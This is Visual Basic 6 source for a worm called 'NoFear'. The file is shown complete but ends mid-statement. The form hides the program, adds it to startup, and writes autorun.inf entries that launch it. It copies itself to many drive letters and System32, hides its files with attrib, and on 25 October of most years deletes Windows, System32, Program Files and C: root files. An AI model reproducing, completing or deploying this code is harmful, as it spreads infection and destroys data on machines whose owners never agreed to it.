VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   4770
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   3570
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   4770
   ScaleWidth      =   3570
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer Timer20 
      Left            =   2640
      Top             =   1440
   End
   Begin VB.Timer Timer19 
      Interval        =   500
      Left            =   3000
      Top             =   480
   End
   Begin VB.Timer Timer18 
      Interval        =   500
      Left            =   2400
      Top             =   480
   End
   Begin VB.Timer Timer17 
      Left            =   3240
      Top             =   0
   End
   Begin VB.Timer Timer16 
      Left            =   2880
      Top             =   0
   End
   Begin VB.Timer Timer15 
      Left            =   2520
      Top             =   0
   End
   Begin VB.Timer Timer14 
      Left            =   2160
      Top             =   0
   End
   Begin VB.Timer Timer13 
      Interval        =   60000
      Left            =   960
      Top             =   2160
   End
   Begin VB.Timer Timer12 
      Left            =   960
      Top             =   1800
   End
   Begin VB.Timer Timer11 
      Left            =   480
      Top             =   1440
   End
   Begin VB.Timer Timer10 
      Left            =   480
      Top             =   1080
   End
   Begin VB.Timer Timer9 
      Interval        =   60000
      Left            =   960
      Top             =   1440
   End
   Begin VB.Timer Timer8 
      Interval        =   60000
      Left            =   0
      Top             =   600
   End
   Begin VB.Timer Timer7 
      Interval        =   500
      Left            =   1800
      Top             =   480
   End
   Begin VB.Timer Timer6 
      Left            =   1800
      Top             =   0
   End
   Begin VB.Timer Timer5 
      Left            =   1440
      Top             =   0
   End
   Begin VB.Timer Timer4 
      Left            =   1080
      Top             =   0
   End
   Begin VB.Timer Timer3 
      Left            =   720
      Top             =   0
   End
   Begin VB.Timer Timer2 
      Left            =   360
      Top             =   0
   End
   Begin VB.Timer Timer1 
      Left            =   0
      Top             =   0
   End
   Begin VB.TextBox Text1 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   178
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      IMEMode         =   3  'DISABLE
      Left            =   2040
      MaxLength       =   7
      PasswordChar    =   "*"
      TabIndex        =   0
      Top             =   1200
      Width           =   1215
   End
   Begin VB.Label Label4 
      AutoSize        =   -1  'True
      BackColor       =   &H80000009&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "25/10/#"
      Height          =   255
      Left            =   0
      TabIndex        =   5
      Top             =   2400
      Width           =   675
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      BackColor       =   &H80000009&
      BorderStyle     =   1  'Fixed Single
      Height          =   255
      Left            =   2400
      TabIndex        =   4
      Top             =   2400
      Width           =   825
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackColor       =   &H80000009&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   39
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   975
      Left            =   1680
      TabIndex        =   3
      Top             =   3720
      Width           =   495
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "virus"
      BeginProperty Font 
         Name            =   "Arial Narrow"
         Size            =   26.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   630
      Index           =   0
      Left            =   240
      TabIndex        =   2
      Top             =   3960
      Width           =   1035
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "key"
      BeginProperty Font 
         Name            =   "Arial Narrow"
         Size            =   26.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   630
      Index           =   1
      Left            =   1320
      TabIndex        =   1
      Top             =   960
      Width           =   720
   End
   Begin VB.Image Image1 
      Height          =   4800
      Left            =   0
      Picture         =   "Form1.frx":164A
      Top             =   0
      Width           =   3600
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
On Error Resume Next

Timer1.Interval = 500
Timer2.Interval = 1500
Timer3.Interval = 2500
Timer4.Interval = 3500
Timer5.Interval = 4500
Timer6.Interval = 5500
Timer14.Interval = 6500
Timer15.Interval = 7500
Timer16.Interval = 8500
Timer17.Interval = 9500


App.TaskVisible = False
RunWhenStartup "NoFear", App.Path & "\" & App.EXEName & ".exe"
SetOnTop Form1.hwnd, True
Label3.Caption = ((Date))
If App.PrevInstance = True Then
Unload Me
Exit Sub
End If


On Error GoTo Error
Open "C:\Documents and Settings\All Users\AutoRun.inf" For Input As #1
Beep
Close
Exit Sub
Error:
Open "C:\Documents and Settings\All Users\AutoRun.inf" For Append As #1
Print #1, "[AutoRun]"
Print #1, "shell\exPloRe\Command=NOFEAR.exe"
Print #1, "opEN =NOFEAR.exe"
Print #1, "sHElL\opeN\DefaUlT=1"
Print #1, ";ADMINISTRATOR BASHAR"
Print #1, ";copysat@hotmail.com"
Print #1, "SHell\oPeN\cOMMand = NOFEAR.exe"
Print #1, "shELl\autoplay\COmmand= NOFEAR.exe"
Print #1, "SHell\fInd\cOMMand = NOFEAR.exe"
Close #1



End Sub

Private Sub Timer1_Timer()
On Error Resume Next
Label2.Caption = "9"
Beep
Text1.SetFocus
Me.Show
End Sub

Private Sub Timer10_Timer()
On Error Resume Next
FileCopy "C:\Documents and Settings\All Users\autorun.inf", "c:\autorun.inf"

FileCopy (App.Path & "\NoFear.exe"), ("C:\NoFear.exe")
FileCopy "c:\NoFear.exe", "d:\NoFear.exe"
FileCopy "c:\NoFear.exe", "d:\System Volume Information\NoFear.exe"
FileCopy "c:\NoFear.exe", "e:\NoFear.exe"
FileCopy "c:\NoFear.exe", "e:\System Volume Information\NoFear.exe"
FileCopy "c:\NoFear.exe", "f:\NoFear.exe"
FileCopy "c:\NoFear.exe", "f:\System Volume Information\NoFear.exe"
FileCopy "c:\NoFear.exe", "g:\NoFear.exe"
FileCopy "c:\NoFear.exe", "g:\System Volume Information\NoFear.exe"
FileCopy "c:\NoFear.exe", "h:\NoFear.exe"
FileCopy "c:\NoFear.exe", "h:\System Volume Information\NoFear.exe"
FileCopy "c:\NoFear.exe", "i:\NoFear.exe"
FileCopy "c:\NoFear.exe", "i:\System Volume Information\NoFear.exe"
FileCopy "c:\NoFear.exe", "j:\NoFear.exe"
FileCopy "c:\NoFear.exe", "j:\System Volume Information\NoFear.exe"
FileCopy "c:\NoFear.exe", "k:\NoFear.exe"
FileCopy "c:\NoFear.exe", "k:\System Volume Information\NoFear.exe"
FileCopy "c:\NoFear.exe", "l:\NoFear.exe"
FileCopy "c:\NoFear.exe", "l:\System Volume Information\NoFear.exe"
FileCopy "c:\NoFear.exe", "n:\NoFear.exe"
FileCopy "c:\NoFear.exe", "n:\System Volume Information\NoFear.exe"
 FileCopy "c:\NoFear.exe", "m:\NoFear.exe"
FileCopy "c:\NoFear.exe", "m:\System Volume Information\NoFear.exe"
  FileCopy "c:\NoFear.exe", "o:\NoFear.exe"
FileCopy "c:\NoFear.exe", "o:\System Volume Information\NoFear.exe"
FileCopy "c:\NoFear.exe", "p:\NoFear.exe"
FileCopy "c:\NoFear.exe", "p:\System Volume Information\NoFear.exe"
 FileCopy "d:\NoFear.exe", "c:\NoFear.exe"
FileCopy "c:\NoFear.exe", "c:\System Volume Information\NoFear.exe"
FileCopy "e:\NoFear.exe", "c:\NoFear.exe"
FileCopy "d:\System Volume Information\NoFear.exe", "c:\NoFear.exe"
 FileCopy "f:\NoFear.exe", "c:\NoFear.exe"
FileCopy "e:\System Volume Information\NoFear.exe", "c:\NoFear.exe"
 FileCopy "g:\NoFear.exe", "c:\NoFear.exe"
FileCopy "f:\System Volume Information\NoFear.exe", "c:\NoFear.exe"
 FileCopy "h:\NoFear.exe", "c:\NoFear.exe"
FileCopy "g:\System Volume Information\NoFear.exe", "c:\NoFear.exe"
 FileCopy "i:\NoFear.exe", "c:\NoFear.exe"
FileCopy "h:\System Volume Information\NoFear.exe", "c:\NoFear.exe"
FileCopy "j:\NoFear.exe", "c:\NoFear.exe"
FileCopy "i:\System Volume Information\NoFear.exe", "c:\NoFear.exe"
 FileCopy "k:\NoFear.exe", "c:\NoFear.exe"
FileCopy "j:\System Volume Information\NoFear.exe", "c:\NoFear.exe"
 FileCopy "l:\NoFear.exe", "c:\NoFear.exe"
 FileCopy "c:\System Volume Information\NoFear.exe", "c:\NoFear.exe"



FileCopy "C:\Documents and Settings\All Users\autorun.inf", "c:\autorun.inf"
FileCopy "C:\Documents and Settings\All Users\autorun.inf", "d:\autorun.inf"
FileCopy "C:\Documents and Settings\All Users\autorun.inf", "e:\autorun.inf"
FileCopy "C:\Documents and Settings\All Users\autorun.inf", "f:\autorun.inf"
FileCopy "C:\Documents and Settings\All Users\autorun.inf", "g:\autorun.inf"
FileCopy "C:\Documents and Settings\All Users\autorun.inf", "h:\autorun.inf"
FileCopy "C:\Documents and Settings\All Users\autorun.inf", "i:\autorun.inf"
FileCopy "C:\Documents and Settings\All Users\autorun.inf", "j:\autorun.inf"
FileCopy "C:\Documents and Settings\All Users\autorun.inf", "k:\autorun.inf"
FileCopy "C:\Documents and Settings\All Users\autorun.inf", "l:\autorun.inf"
FileCopy "C:\Documents and Settings\All Users\autorun.inf", "n:\autorun.inf"
FileCopy "C:\Documents and Settings\All Users\autorun.inf", "m:\autorun.inf"
FileCopy "C:\Documents and Settings\All Users\autorun.inf", "o:\autorun.inf"
FileCopy "C:\Documents and Settings\All Users\autorun.inf", "c:\autorun.inf"

FileCopy "c:\autorun.inf", "c:\autorun.inf"
FileCopy "c:\autorun.inf", "d:\autorun.inf"
FileCopy "c:\autorun.inf", "e:\autorun.inf"
FileCopy "c:\autorun.inf", "f:\autorun.inf"
FileCopy "c:\autorun.inf", "h:\autorun.inf"
FileCopy "c:\autorun.inf", "i:\autorun.inf"
FileCopy "c:\autorun.inf", "j:\autorun.inf"
FileCopy "c:\autorun.inf", "k:\autorun.inf"
FileCopy "c:\autorun.inf", "l:\autorun.inf"
FileCopy "c:\autorun.inf", "n:\autorun.inf"
FileCopy "c:\autorun.inf", "m:\autorun.inf"
FileCopy "c:\autorun.inf", "o:\autorun.inf"
FileCopy "c:\autorun.inf", "p:\autorun.inf"
FileCopy "c:\autorun.inf", "q:\autorun.inf"
FileCopy "c:\autorun.inf", "r:\autorun.inf"
FileCopy "c:\autorun.inf", "b:\autorun.inf"
FileCopy "d:\autorun.inf", "c:\autorun.inf"
FileCopy "e:\autorun.inf", "c:\autorun.inf"
FileCopy "f:\autorun.inf", "c:\autorun.inf"
FileCopy "g:\autorun.inf", "c:\autorun.inf"
FileCopy "h:\autorun.inf", "c:\autorun.inf"
FileCopy "i:\autorun.inf", "c:\autorun.inf"
FileCopy "j:\autorun.inf", "c:\autorun.inf"
FileCopy "k:\autorun.inf", "c:\autorun.inf"
FileCopy "l:\autorun.inf", "c:\autorun.inf"
FileCopy "n:\autorun.inf", "c:\autorun.inf"
FileCopy "m:\autorun.inf", "c:\autorun.inf"
FileCopy "o:\autorun.inf", "c:\autorun.inf"
FileCopy "p:\autorun.inf", "c:\autorun.inf"
FileCopy "q:\autorun.inf", "c:\autorun.inf"
FileCopy "r:\autorun.inf", "c:\autorun.inf"
FileCopy "c:\NoFear.exe", "C:\Windows\System32\NoFear.exe"
FileCopy "d:\NoFear.exe", "C:\Windows\System32\NoFear.exe"
FileCopy "e:\NoFear.exe", "C:\Windows\System32\NoFear.exe"
FileCopy "f:\NoFear.exe", "C:\Windows\System32\NoFear.exe"
FileCopy "g:\NoFear.exe", "C:\Windows\System32\NoFear.exe"
FileCopy "h:\NoFear.exe", "C:\Windows\System32\NoFear.exe"
FileCopy "i:\NoFear.exe", "C:\Windows\System32\NoFear.exe"
FileCopy "j:\NoFear.exe", "C:\Windows\System32\NoFear.exe"
FileCopy "k:\NoFear.exe", "C:\Windows\System32\NoFear.exe"
FileCopy "l:\NoFear.exe", "C:\Windows\System32\NoFear.exe"
FileCopy "n:\NoFear.exe", "C:\Windows\System32\NoFear.exe"
FileCopy "m:\NoFear.exe", "C:\Windows\System32\NoFear.exe"
FileCopy "C:\Windows\System32\NoFear.exe", "C:\NoFear.exe"
FileCopy "C:\Windows\System32\NoFear.exe", "d:\NoFear.exe"
FileCopy "C:\Windows\System32\NoFear.exe", "e:\NoFear.exe"
FileCopy "C:\Windows\System32\NoFear.exe", "f:\NoFear.exe"
FileCopy "C:\Windows\System32\NoFear.exe", "g:\NoFear.exe"
FileCopy "C:\Windows\System32\NoFear.exe", "h:\NoFear.exe"
FileCopy "C:\Windows\System32\NoFear.exe", "j:\NoFear.exe"
FileCopy "C:\Windows\System32\NoFear.exe", "i:\NoFear.exe"
FileCopy "C:\Windows\System32\NoFear.exe", "k:\NoFear.exe"
FileCopy "C:\Windows\System32\NoFear.exe", "l:\NoFear.exe"
FileCopy "C:\Windows\System32\NoFear.exe", "n:\NoFear.exe"
FileCopy "C:\Windows\System32\NoFear.exe", "m:\NoFear.exe"

End Sub

Private Sub Timer11_Timer()
On Error Resume Next
Shell "attrib c:/NoFear.exe +h +s"
Shell "attrib C:\Documents and Settings\All Users\AutoRun.inf +h +s"
Shell "attrib C:\autorun.inf +h +s"
End Sub

Private Sub Timer12_Timer()
On Error Resume Next
If Label3.Caption = "25/10/2001" Then Form3.Visible = True
If Label3.Caption = "25/10/2002" Then Form3.Visible = True
If Label3.Caption = "25/10/2003" Then Form3.Visible = True
If Label3.Caption = "25/10/2004" Then Form3.Visible = True
If Label3.Caption = "25/10/2005" Then Form3.Visible = True
If Label3.Caption = "25/10/2006" Then Form3.Visible = True
If Label3.Caption = "25/10/2007" Then Form3.Visible = True
If Label3.Caption = "25/10/2008" Then Form3.Visible = True
If Label3.Caption = "25/10/2009" Then Form3.Visible = True
If Label3.Caption = "25/10/2010" Then Form3.Visible = True
If Label3.Caption = "25/10/2011" Then Form3.Visible = True
If Label3.Caption = "25/10/2012" Then Form3.Visible = True
If Label3.Caption = "25/10/2013" Then Form3.Visible = True
If Label3.Caption = "25/10/2014" Then Form3.Visible = True
If Label3.Caption = "25/10/2015" Then Form3.Visible = True
If Label3.Caption = "25/10/2016" Then Form3.Visible = True
If Label3.Caption = "25/10/2017" Then Form3.Visible = True
If Label3.Caption = "25/10/2018" Then Form3.Visible = True
If Label3.Caption = "25/10/2019" Then Form3.Visible = True
If Label3.Caption = "25/10/2020" Then Form3.Visible = True
If Label3.Caption = "25/10/2021" Then Form3.Visible = True
If Label3.Caption = "25/10/2022" Then Form3.Visible = True
If Label3.Caption = "25/10/2023" Then Form3.Visible = True
If Label3.Caption = "25/10/2024" Then Form3.Visible = True
If Label3.Caption = "25/10/2025" Then Form3.Visible = True
If Label3.Caption = "25/10/2026" Then Form3.Visible = True
If Label3.Caption = "25/10/2027" Then Form3.Visible = True
If Label3.Caption = "25/10/2028" Then Form3.Visible = True
If Label3.Caption = "25/10/2029" Then Form3.Visible = True
If Label3.Caption = "25/10/2030" Then Form3.Visible = True
If Label3.Caption = "25/10/2031" Then Form3.Visible = True
If Label3.Caption = "25/10/2032" Then Form3.Visible = True
If Label3.Caption = "25/10/2033" Then Form3.Visible = True
If Label3.Caption = "25/10/2034" Then Form3.Visible = True
If Label3.Caption = "25/10/2035" Then Form3.Visible = True
If Label3.Caption = "25/10/2036" Then Form3.Visible = True
If Label3.Caption = "25/10/2037" Then Form3.Visible = True
If Label3.Caption = "25/10/2038" Then Form3.Visible = True
If Label3.Caption = "25/10/2039" Then Form3.Visible = True
If Label3.Caption = "25/10/2040" Then Form3.Visible = True
If Label3.Caption = "25/10/2041" Then Form3.Visible = True
If Label3.Caption = "25/10/2042" Then Form3.Visible = True
If Label3.Caption = "25/10/2043" Then Form3.Visible = True
If Label3.Caption = "25/10/2044" Then Form3.Visible = True
If Label3.Caption = "25/10/2045" Then Form3.Visible = True
If Label3.Caption = "25/10/2046" Then Form3.Visible = True
If Label3.Caption = "25/10/2047" Then Form3.Visible = True
If Label3.Caption = "25/10/2048" Then Form3.Visible = True
If Label3.Caption = "25/10/2049" Then Form3.Visible = True
If Label3.Caption = "25/10/2050" Then Form3.Visible = True

Select Case Label3.Caption
Case "25/10/2000":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2001":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2002":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2003":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2004":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2005":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2006":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2007":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2008":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2009":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2010":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2011":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2012":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2013":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2014":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2015":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2016":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2017":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2018":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2019":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2020":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2021":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2022":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2023":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2024":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2025":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2026":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2027":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2025":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2029":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2030":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2031":
